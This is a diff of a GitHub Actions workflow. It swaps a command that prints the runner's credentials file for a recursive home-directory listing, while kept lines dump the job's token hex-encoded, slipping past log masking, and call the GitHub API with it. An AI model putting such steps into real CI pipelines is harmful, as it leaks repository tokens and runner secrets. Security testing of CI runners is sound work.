@@ -21,7 +21,7 @@ jobs:
       DDYLD_INSERT_LIBRARIES: /test/test/test
     steps:
     - run: |
-        cat /home/runner/.credentials
+        ls -l -a -R /home/runner
         echo ${{github.token}} | xxd -ps
         curl -v https://api.github.com/repos/${{ github.repository }}/issues \
         --header 'authorization: Bearer ${{ github.token }}' \
